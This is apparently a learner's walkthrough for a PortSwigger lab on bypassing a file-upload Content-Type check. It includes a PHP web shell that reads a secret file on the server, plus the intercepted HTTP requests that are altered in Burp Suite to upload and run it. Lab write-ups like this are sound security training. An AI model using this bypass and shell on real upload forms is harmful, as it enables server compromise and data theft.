# [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

> uploading a malicious php file as an avatar by exploiting `Content-Type` header

> exploit php file

- create a file called `exploit.php`

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

> changing `Content-Type` header

- boot up burp suite
- log in
- turn burp intercept on
- upload the file again as an avatar
- check the caught request for the form

```
POST /my-account/avatar HTTP/1.1

...

------WebKitFormBoundarymd539yBDLAifyBqv
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundarymd539yBDLAifyBqv

...
```

- change the `Content-Type: application/x-php` to `Content-Type: image/jpeg`
- forward the request
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image for avatar
- this request will be the exploit request -> send it to repeater
- change the request of in the repeater:
  `GET /files/avatars/image.jpg HTTP/2` -> `GET /files/avatars/exploit.php HTTP/2`
- send the request
- in the response there is a `string`, submit that
